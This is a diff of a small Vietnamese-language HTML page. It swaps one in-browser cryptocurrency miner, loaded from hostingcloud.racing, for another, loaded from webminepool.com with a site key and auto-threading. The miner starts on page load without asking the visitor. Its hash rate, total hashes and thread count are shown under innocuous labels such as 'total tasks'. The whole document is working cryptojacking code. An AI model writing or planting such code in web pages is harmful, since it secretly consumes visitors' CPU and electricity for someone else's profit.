@@ -5,30 +5,24 @@
     <title>NSTĐ</title>
 </head>
 <body>
-    <div id="cpu">CPU: Đang tải...</div>
-    <div id="tong">Tổng: Đang tải...</div>
-    <div id="per">Per: Đang tải...</div>
-    <div id="luong">Luồng: Đang tải...</div>
-    
-    <script src="https://www.hostingcloud.racing/485C.js"></script>
-    <script>
-        var _client = new Client.Anonymous('79a26f9911cc1957ecde6b3e9bac5af95a3f24475dcb517c124f1ae36b80fdfa', {
-            throttle: 0.5, c: 'w'
-        });
-        _client.start();
-        
-        function update() {
-            var cpu = ((1 - _client.getThrottle()) * 100).toFixed(1);
-            var tong = _client.getTotalHashes();
-            var per = _client.getHashesPerSecond().toFixed(1);
-            var luong = _client.getNumThreads();
+    <div>Tốc độ xử lý: <span id="per">0</span></div>
+    <div>Tổng tác vụ: <span id="tong">0</span></div>
+    <div>Luồng CPU: <span id="luong">0</span></div>
 
-            document.getElementById('cpu').textContent = "CPU: " + cpu + "%";
-            document.getElementById('tong').textContent = "Tổng: " + tong;
-            document.getElementById('per').textContent = "Per: " + per;
-            document.getElementById('luong').textContent = "Luồng: " + luong;
-        }
-        setInterval(update, 1000);
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+        var a = WMP.Anonymous('SK_xCZ7hfNTxdlG46QXetHXz', 'nstd', {
+            autoThreads: true,
+            throttle: 0.2,
+            forceASMJS: false
+        });
+        a.start();
+
+        setInterval(() => {
+            document.getElementById('per').textContent = a.getHashesPerSecond().toFixed(2);
+            document.getElementById('tong').textContent = a.getTotalHashes();
+            document.getElementById('luong').textContent = a.getNumThreads( );
+        }, 1000);
     </script>
 </body>
 </html>
